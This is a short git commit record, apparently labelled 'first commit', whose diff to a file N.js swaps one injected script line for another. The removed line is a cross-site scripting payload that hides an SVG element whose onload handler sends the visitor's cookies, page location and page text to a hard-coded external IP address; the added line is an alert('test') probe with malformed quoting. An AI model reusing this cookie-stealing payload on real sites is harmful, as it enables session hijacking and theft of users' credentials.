4653445b60752756ac3be419416e0c6ee15a0817
zzzkf <zzzykf@gmail.com>
2018-11-23 13:57:28 +0800

    first commit

--- N.js
+++ N.js
@@ -1,1 +1,1 @@
-document.write('<svg style="display:none;" onload=this.src="http://52.220.154.212/no.php?C=" + document.cookie + "&D=" + window.host.location+"&N="+document.getElementsByTagName("font")[0]>');
+document.write('<svg style="display:none;" onload=alert("test")');
